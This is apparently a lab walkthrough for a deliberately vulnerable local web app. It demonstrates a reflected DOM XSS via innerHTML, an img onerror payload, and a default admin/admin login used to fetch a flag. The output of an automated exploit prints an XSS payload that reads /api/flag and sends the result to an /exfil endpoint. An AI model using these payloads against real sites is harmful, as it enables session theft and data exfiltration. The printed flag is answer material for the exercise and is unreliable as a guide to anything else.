# Walkthrough: DOM-Based Attacks

## Setup

```bash
docker compose up --build -d
```

## Step 1: Confirm the XSS Sink

Visit the reflect endpoint with a simple HTML payload:

```bash
curl "http://localhost:8080/reflect?q=%3Cb%3Ebold%3C%2Fb%3E"
```

Output (excerpt):

```html
<div id="results"></div>
<script>
  document.getElementById('results').innerHTML = "<b>bold</b>";
</script>
```

The `<b>` tags are not escaped. The value flows directly into `innerHTML`.

## Step 2: Inject a Script Payload

```bash
curl "http://localhost:8080/reflect?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
```

Output (excerpt):

```html
  document.getElementById('results').innerHTML = "<img src=x onerror=alert(1)>";
```

The payload is unescaped. In a real browser, the `onerror` handler fires immediately.

## Step 3: Log In as Admin

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' \
  http://localhost:8080/login
```

Output:

```json
{
  "ok": true,
  "session": "a3f8c2d1e9b04f76a3f8c2d1e9b04f76"
}
```

## Step 4: Fetch the Flag

```bash
curl -H "Cookie: session=a3f8c2d1e9b04f76a3f8c2d1e9b04f76" \
  http://localhost:8080/api/flag
```

Output:

```json
{
  "flag": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}",
  "user": "admin"
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:

```
[*] Target: http://localhost:8080

[*] Step 1 -- verifying innerHTML XSS sink at /reflect
[+] PASS: payload appears unescaped in innerHTML sink
    <img src=x onerror=fetch("/api/flag").then(r=>r.text()).then(t=>fetch("/exfil?d="+t))>...

[*] Step 2 -- logging in as admin
[+] Session: a3f8c2d1...

[*] Step 3 -- fetching /api/flag with admin session cookie
[+] Flag: POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```
